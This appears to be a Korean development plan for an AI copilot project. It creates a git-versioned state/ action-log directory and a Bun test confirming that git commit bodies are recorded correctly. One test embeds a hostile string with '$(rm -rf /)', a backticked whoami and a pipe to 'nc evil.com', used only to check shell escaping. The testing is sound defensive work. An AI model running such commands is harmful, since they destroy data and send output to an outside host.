---
plan_id: "00-02"
phase: 0
title: "state/ 디렉토리 init + 첫 git commit (Spike 4)"
wave: 1
depends_on: []
files_modified:
  - "state/.gitkeep"
  - "state/README.md"
  - "spikes/04-git-commit.test.ts"
requirements: ["BOOT-01"]
autonomous: true
estimated_minutes: 15
---

# 00-02: state/ 디렉토리 init + Spike 4 (git commit roundtrip)

<objective>
Phase 2의 audit trail (`state/` git-versioned action log)을 위한 디렉토리 구조를 만들고, **Spike 4 검증** — `Bun.$ \`git commit\``가 `state/` 내부에서 본문 포함 commit을 정상 생성하는지 확인.

`state/`는 **메인 repo의 서브디렉토리**다 (D-04). 별도 submodule이 아니다. fast-forward only enforcement는 Phase 2 APPLY-07에서 처리하므로, 이번 plan에서는 디렉토리 + .gitkeep + README + Spike 4 통과만 만든다.

**must_haves.truths:**
- D-04 (CONTEXT.md): `state/`는 메인 repo의 서브디렉토리, 별도 git/submodule 비-사용
- D-01 (CONTEXT.md): Spike 코드는 `spikes/` 임시 디렉토리에 격리
- BOOT-01 Spike 4 통과 기준: `Bun.$ \`git commit -m "msg" --allow-empty\``가 `state/` 안에 body 포함 commit 기록
</objective>

<must_haves>
## Truths

- D-04: `state/`는 메인 repo 서브디렉토리. 별도 submodule이나 외부 repo로 분리하지 않음.
- D-01: Spike 코드는 `spikes/` 디렉토리에 격리. 이 plan의 Spike 4 코드는 `spikes/04-git-commit.test.ts`.
- Spike 4 통과 기준: empty commit이 `git log` 에 message body 포함하여 표시되어야 한다.

## Verification anchors

- `state/` 디렉토리 존재 + `state/.gitkeep` 존재 (디렉토리 git tracked)
- `state/README.md` 존재
- `spikes/04-git-commit.test.ts` 존재 + `Bun.$` 사용 + `--allow-empty` 사용
- `bun test spikes/04-git-commit.test.ts` 종료 코드 0
</must_haves>

<task id="00-02-t01" type="execute">
<title>state/ 디렉토리 + .gitkeep + README 생성</title>
<read_first>
- `.planning/phases/00-bootstrap-spikes/00-CONTEXT.md` D-04
- `.planning/PROJECT.md` Key Decisions (`state/ 를 본 repo에 두고 별도 submodule 비-사용`)
</read_first>
<action>
```bash
mkdir -p state
touch state/.gitkeep
```

`state/README.md` 생성:

```markdown
# state/ — Git-Versioned Action Log

이 디렉토리는 gons-works AI copilot의 모든 운영 액션이 기록되는 곳이다.

## 구조 (Phase 1+ 채워짐)

- `actions/` — 한 .md 파일 = 한 commit. user prompt + AI reasoning + 결과 요약.
- `snapshots/` — 액션 시점 `docker ps` 출력.
- `services.yaml` — 5 핵심 stack(news/ais/n8n/open-webui/krdn-fx) 도메인 지식. Phase 0에서 AI 초안 생성, 사용자 review 후 첫 commit.

## 정책

- **Phase 1**: read-only 도구 호출도 SQLite event log + `state/` commit 으로 기록 (AUDIT-01).
- **Phase 2**: `proposePatch`/`applyPatch` 5-key 게이트로 승인된 변경은 2PC commit 순서 (docker exec 먼저 → 성공 시 git commit).
- **fast-forward only**: pre-commit hook으로 강제 (Phase 2 APPLY-07).

## 본 repo와의 관계

`state/`는 메인 repo의 서브디렉토리다 (별도 submodule 비-사용). 추후 `homelab-state` 별 repo로 분리하는 옵션은 v2 STATE-SUB-01에 보존.

## git log 사용 패턴

```bash
git log state/                    # 모든 액션 이력
git log state/ --since="1 week ago"
git log state/ -p actions/2026-05-06_apply-patch_voice-restart.md  # 특정 액션의 patch
```
```
</action>
<acceptance_criteria>
- `state/` 디렉토리 존재
- `state/.gitkeep` 빈 파일 존재
- `state/README.md` 존재 + `Git-Versioned Action Log` grep 가능
- `state/README.md`에 `D-04` 의미가 반영된 문장 grep 가능 (`별도 submodule 비-사용` 또는 동등 표현)
- `git status state/`가 untracked 표시 (아직 commit 안 함)
</acceptance_criteria>
</task>

<task id="00-02-t02" type="execute">
<title>spikes/04-git-commit.test.ts — Bun.$ git commit 검증</title>
<read_first>
- 방금 만든 `state/` 디렉토리
- `.planning/research/STACK.md` (Bun.$ shell 섹션)
- `.planning/ROADMAP.md` Phase 0 Spike List (Spike 4 통과 기준)
</read_first>
<action>
`spikes/04-git-commit.test.ts` 생성:

```typescript
import { describe, expect, test } from "bun:test"
import { $ } from "bun"
import { mkdtemp, rm } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"

// Spike 4: Bun.$ git commit roundtrip 검증.
// state/ 디렉토리 시뮬레이션을 위해 temp 디렉토리에 별도 git repo를 만들고
// Bun.$ 가 multi-line commit body를 정상 기록하는지 확인.

describe("Spike 4: Bun.$ git commit (BOOT-01)", () => {
  test("--allow-empty + body 포함 commit이 git log에 표시됨", async () => {
    const dir = await mkdtemp(join(tmpdir(), "gons-spike4-"))
    try {
      await $`git init -q`.cwd(dir)
      await $`git config user.email "spike@example.com"`.cwd(dir)
      await $`git config user.name "Spike Test"`.cwd(dir)
      await $`git config commit.gpgsign false`.cwd(dir)

      const subject = "feat(spike4): empty commit with body"
      const body = "사용자 요청: ais-prod redis 메모리 확인\n\nAI reasoning: docker stats 출력 분석"

      // Bun.$ 가 multi-line body를 escape 없이 처리하는지 검증.
      // 실제 Phase 2에서는 동일 패턴으로 user prompt + AI reasoning을 commit.
      await $`git commit --allow-empty -m ${subject} -m ${body}`.cwd(dir)

      const log = await $`git log -1 --format=%s%n---%n%b`.cwd(dir).text()

      expect(log).toContain(subject)
      expect(log).toContain("ais-prod redis 메모리 확인")
      expect(log).toContain("AI reasoning: docker stats 출력 분석")
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })

  test("shell metachar(파이프, 백틱)이 포함된 body가 escape 없이 commit됨", async () => {
    const dir = await mkdtemp(join(tmpdir(), "gons-spike4-meta-"))
    try {
      await $`git init -q`.cwd(dir)
      await $`git config user.email "spike@example.com"`.cwd(dir)
      await $`git config user.name "Spike Test"`.cwd(dir)
      await $`git config commit.gpgsign false`.cwd(dir)

      // Phase 2 APPLY-06 검증과 직접 연결: shell metachar escape.
      const dangerous = "user typed: $(rm -rf /) and `whoami` and | nc evil.com"

      await $`git commit --allow-empty -m "test" -m ${dangerous}`.cwd(dir)
      const body = await $`git log -1 --format=%b`.cwd(dir).text()

      expect(body).toContain("$(rm -rf /)")
      expect(body).toContain("`whoami`")
      expect(body).toContain("| nc evil.com")
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })
})
```

이 테스트는 두 가지를 검증:
1. **Spike 4 통과 기준** (ROADMAP.md): `--allow-empty` + body가 `git log`에 정상 기록.
2. **Phase 2 사전 검증**: `Bun.$` template literal interpolation이 shell metachar를 자동 escape하는지 (Phase 2 APPLY-06 commit body sanitization의 토대).
</action>
<acceptance_criteria>
- `spikes/04-git-commit.test.ts` 존재 + `import { $ } from "bun"` grep 가능 + `--allow-empty` grep 가능
- `bun test spikes/04-git-commit.test.ts` 종료 코드 0
- 출력에 `2 pass` (또는 `2 passed`) grep 가능
- 어떤 임시 디렉토리도 leak 안 됨 (`/tmp/gons-spike4-*`가 테스트 후 모두 삭제)
</acceptance_criteria>
</task>

<verification>
## 검증 (Spike 4 통과)

```bash
test -d state
test -f state/.gitkeep
test -f state/README.md
test -f spikes/04-git-commit.test.ts
grep -q "별도 submodule 비-사용" state/README.md || grep -q "submodule" state/README.md
grep -q '$ } from "bun"' spikes/04-git-commit.test.ts
grep -q "allow-empty" spikes/04-git-commit.test.ts
bun test spikes/04-git-commit.test.ts
```

`bun test spikes/04-git-commit.test.ts`가 2 pass로 종료 코드 0.

이 plan 통과 시:
- Spike 4 ✓ green (BOOT-01의 1/5 spike)
- Phase 2 APPLY-06 commit body sanitization의 사전 검증
- D-04 (state/ 메인 repo 서브디렉토리) 구조 확정
</verification>
